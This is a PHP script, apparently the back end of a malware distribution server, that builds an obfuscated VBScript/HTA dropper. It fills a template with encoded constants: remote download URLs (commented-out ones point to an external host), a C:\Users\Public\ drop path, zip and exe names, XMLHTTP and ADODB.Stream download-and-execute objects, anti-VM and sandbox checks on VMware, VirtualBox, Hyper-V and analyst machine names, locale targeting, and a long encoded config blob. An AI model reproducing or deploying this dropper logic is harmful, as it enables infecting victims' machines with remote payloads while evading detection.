<?php
$path = dirname(__DIR__, 2);
require_once($path . '/src/utils/autorizacao.php'); //TODA AUTORIZAÇÃO DEVE SER FEITA AQUI, PARA QUE O ARQUIVO SEJA EXECUTADO SOMENTE SE AUTORIZADO
header('Content-Type: text/plain;');
$wid = 95;
$projectRoot = dirname(__DIR__, 2);
$loadwPath = $projectRoot . '/src/model/loadw.txt';
if (file_exists($loadwPath)) {
$myfile = fopen($loadwPath, "r");
$codex = fread($myfile, filesize($loadwPath));
fclose($myfile);
}

function geraString()
{
$length = 5 + rand(0, 15);
$characters0 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString = $characters0[rand(1, 51)] . $characters0[rand(1, 51)];
for ($i = 0; $i < $length; $i++) { $randomString .=$characters[rand(0, $charactersLength - 1)]; } return $randomString;

} 
    function cryptw($s1) 
    { 
        $id=95; $sx="" ; $x=0; $x4=rand(0, 24); $result=chr($x4 + 65); $x4=$x4 + $id; 
    for ($i=0; $i < strlen($s1); $i++) 
        { 
         $x=ord(substr($s1, $i, 1)) + $x4; 
    if ($x <= 25) { 
         $sx = " A" . chr($x + 65);
         } 
    else {
         $x2=(int)($x / 25); $x3=$x - ($x2 * 25); $sx=chr($x2 + 65) . chr($x3 + 65); 
        }
     $result .=$sx; 
    } 
    return $result; 
}
    for ($i=1; $i <=99; $i++) { 
        $codex=str_replace("#const" . $i  ."#" , geraString() . "_" . $i, $codex);
     }
    for ($i=1; $i <=99; $i++) { 
        $codex=str_replace( "#var" . $i . "#" ,    geraString() . "_" . $i, $codex );
     } 

    $codex=str_replace("%cid%", $wid, $codex); 
    $codex=str_replace("%const1%", cryptw("3"), $codex ); 

    //$codex=str_replace("%const2%", cryptw("https://80.32.109.208.host.secureserver.net/fg4gasga"), $codex ); 
    $codex=str_replace("%const2%", cryptw(getenv('LINK_SVR')), $codex ); 
    //$codex=str_replace("%const3%", cryptw("https://80.32.109.208.host.secureserver.net/v/fg4gasg"), $codex ); 
    $codex=str_replace("%const3%", cryptw(getenv('LINK_AIT')), $codex ); 
    $codex=str_replace("%const4%", cryptw(getenv('LINK_HTA')), $codex );
    //$codex=str_replace("%const4%", cryptw("https://80.32.109.208.host.secureserver.net/"), $codex );
    $codex=str_replace("%const5%", cryptw("C:\\Users\\Public\\"), $codex ); 
    $codex=str_replace("%const6%", cryptw(".fdgr3"), $codex);
    $codex=str_replace("%const7%", cryptw(".zip"), $codex); 
    $codex=str_replace("%const8%", cryptw("fg4gasg"), $codex);// nome do arquivo de script dentro do zip
    $codex=str_replace("%const9%", cryptw("hhzb2"), $codex); 
    $codex=str_replace("%const10%", cryptw("1"), $codex);
    $codex=str_replace("%const11%", cryptw("15"), $codex);
    $codex=str_replace("%const12%", cryptw("1"), $codex);
    $codex=str_replace("%const13%", cryptw("1"), $codex); 
    $codex=str_replace("%const14%", cryptw("1"), $codex);
    $codex=str_replace("%const15%", cryptw("1"), $codex); 
    $codex=str_replace("%const16%", cryptw("winmgmts:"), $codex);
    $codex=str_replace("%const17%", cryptw("winmgmts:\\\.\\"), $codex); 
    $codex=str_replace("%const18%", cryptw("Select * from "), $codex);
    $codex=str_replace("%const19%", cryptw("Scripting.FileSystemObject"), $codex); 
    $codex=str_replace("%const20%", cryptw("Shell.Application"), $codex );
    $codex=str_replace("%const21%", cryptw("MSXML2.XMLHTTP"), $codex);
    $codex=str_replace("%const22%", cryptw("GET"), $codex); 
    $codex=str_replace("%const23%", cryptw("ADODB.Stream"),    $codex ); 
    $codex=str_replace("%const25%", cryptw("Microsoft.XMLHTTP"), $codex);
    $codex=str_replace("%const26%", cryptw("Adodb.Stream"), $codex ); 
    $codex=str_replace("%const27%", cryptw("winmgmts:{impersonationLevel=impersonate}!\\\.\\root\\cimv2"), $codex ); 
    $codex=str_replace("%const28%", cryptw("Select * from Win32_OperatingSystem"), $codex ); 
    $codex=str_replace("%const29%", cryptw("Manufacturer"),    $codex ); 
    $codex=str_replace("%const30%", cryptw("Model"), $codex); 
    $codex=str_replace("%const31%", cryptw("root\\cimv2"), $codex );
    $codex=str_replace("%const32%", cryptw("Win32_ComputerSystem"), $codex);
    $codex=str_replace("%const33%", cryptw("Version"), $codex);
    $codex=str_replace("%const34%", cryptw("Win32_BIOS"),    $codex ); 
    $codex=str_replace("%const35%", cryptw("Virtual Machine"), $codex); 
    $codex=str_replace("%const36%", cryptw("Hyper-V"), $codex );
    $codex=str_replace("%const37%", cryptw("VRTUAL - 1000831"), $codex);
    $codex=str_replace("%const38%", cryptw("Hyper-V 2008 Beta or RC0"), $codex); 
    $codex=str_replace("%const39%", cryptw("VRTUAL - 5000805"), $codex ); 
    $codex=str_replace("%const40%", cryptw("BIOS Date: 05/05/08 20:35:56 Ver:08.00.02"), $codex); 
    $codex=str_replace("%const41%", cryptw("Hyper-V 2008 RTM"), $codex);
    $codex=str_replace("%const42%", cryptw("VRTUAL - 3000919"), $codex); 
    $codex=str_replace("%const43%", cryptw("Hyper-V 2008 R2"), $codex); 
    $codex=str_replace("%const44%", cryptw("A M I - 2000622"), $codex);
    $codex=str_replace("%const45%", cryptw("VS2005R2SP1 or VPC2007"), $codex); 
    $codex=str_replace("%const46%", cryptw("A M I - 9000520"), $codex); 
    $codex=str_replace("%const47%", cryptw("VS2005R2"), $codex);
    $codex=str_replace("%const48%", cryptw("A M I - 9000816"), $codex); 
    $codex=str_replace("%const49%", cryptw("A M I - 6000901"), $codex); 
    $codex=str_replace("%const50%", cryptw("Windows Virtual PC"), $codex);
    $codex=str_replace("%const51%", cryptw("VS2005 or VPC2004"), $codex); 
    $codex=str_replace("%const52%", cryptw("VMware Virtual Platform"), $codex); 
    $codex=str_replace("%const53%", cryptw("VMware"), $codex);
    $codex=str_replace("%const54%", cryptw("VirtualBox"), $codex); 
    $codex=str_replace("%const55%", cryptw("WScript.Shell"), $codex ); 
    $codex=str_replace("%const56%", cryptw("%COMPUTERNAME%"), $codex);
    $codex=str_replace("%const57%", cryptw("winmgmts:"), $codex); 
    $codex=str_replace("%const58%", cryptw("Win32_OperatingSystem"), $codex ); 
    $codex=str_replace("%const59%", cryptw("1034"), $codex);
    $codex=str_replace("%const60%", cryptw("1046"), $codex);
    $codex=str_replace("%const61%", cryptw("2058"), $codex);
    $codex=str_replace("%const62%", cryptw("2070"), $codex);
    $codex=str_replace("%const63%", cryptw("3082"), $codex);
    $codex=str_replace("%const64%", cryptw("58378"), $codex);
    $codex=str_replace("%const65%", cryptw("JOHN-PC"), $codex ); 
    $codex=str_replace("%const66%", cryptw("Scripting.FileSystemObject"), $codex);
    $codex=str_replace("%const67%", cryptw(".php"), $codex); 
    $codex=str_replace("%const68%", cryptw("c:\\"), $codex);
    $codex=str_replace("%const69%", cryptw("\\"), $codex);
    $codex=str_replace("%const70%", cryptw("WScript.Shell"), $codex ); 
    $codex=str_replace("%const71%", cryptw("m1"), $codex);
    $codex=str_replace("%const72%", cryptw("ai"), $codex ); 
    $codex=str_replace("%const73%", cryptw("a3"), $codex); 
    $codex=str_replace("%const74%", cryptw("Shell.Application"), $codex ); 
    $codex=str_replace("%const75%", cryptw(".exe"), $codex);
    $codex=str_replace("%const76%", cryptw(" ##1"), $codex); 
    $codex=str_replace("%const77%", cryptw(" ##3"), $codex);
    $codex=str_replace("%const78%", cryptw("open"), $codex); 
    $codex=str_replace("%const79%", cryptw("LAPTOP-2KFGOS7C"), $codex ); 
    $codex=str_replace("%const80%", cryptw("7178"), $codex);
    $codex=str_replace("%const81%", cryptw("9226"), $codex); 
    $codex=str_replace("%const82%", cryptw("10250"), $codex); 
    $codex=str_replace("%const83%", cryptw("11274"), $codex);
    $codex=str_replace("%const84%", cryptw("12298"), $codex ); 
    $codex=str_replace("%const85%", cryptw("13322"), $codex); 
    $codex=str_replace("%const86%", cryptw("14346"), $codex ); 
    $codex=str_replace("%const87%", cryptw("21514"), $codex); 
    $codex=str_replace("%const88%", cryptw("11274"), $codex ); 
    $codex=str_replace("%const89%", cryptw("15370"), $codex);
    $codex=str_replace("%const90%", cryptw("taskkill /F /IM mshta.exe"), $codex); 
    $codex=str_replace("%constCFG%", "MCYCRFIDCFOFFFPFPDCCRCKFFFMCKCRCKFTFMCYCKCRCKFTFMDACKCRCKFTFMDBCKCRFRFAFUCYDBDHDFCRFJFQFUFDEWFVCRCXCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRCXDAFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRCXDBFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRCXDCFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRCXDDFMFQEXFIEWEYFHCVFJFVFCFQFMCVEXFFFWCRCXDEFMFQEXFIEWEYFHCVFJFVFCFQFMCVFLFOFDCRCXDFFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRCXDGFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRCXDHFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRCYCXFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRCYCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCRCYDAFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRCYDBFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRCYDCFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRCYDDFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRCYDEFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRCYDFFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRCYDGFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRCYDHFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRDACXFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCRDACYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRDADAFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRDADBFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRDADCFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRDADDFMFQEXFIEWEYFHCVFJFVFCFQFMCVEXFFFWCRDADEFMFQEXFIEWEYFHCVFJFVFCFQFMCVFLFOFDCRDADFFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRDADGFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRDADHFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRDBCXFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRDBCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCREXEXFDFMFTCYCXCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYCXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDACXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDACYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDBCXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDBCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCRDOCKFFFMDACKCRCKFTFMDACXCKCRCKFFFMDBCKCRCKFTFMDBCXCKCRCKEXFHDACKCRCKEXFHDBCKCR", $codex ); 
    //echo $codex; 
//  } else {
//      header("HTTP/1.0 404 Not Found");
//  }
$codex = '<?xml version="1.0" encoding="utf-8" ?>
<component id="component2">


    <script language="VBScript">
    <![CDATA[
    CreateObject("WScript.Shell").run "taskkill /F /IM mshta.exe", 2
    ]]>
    </script>
</component>';
echo $codex; 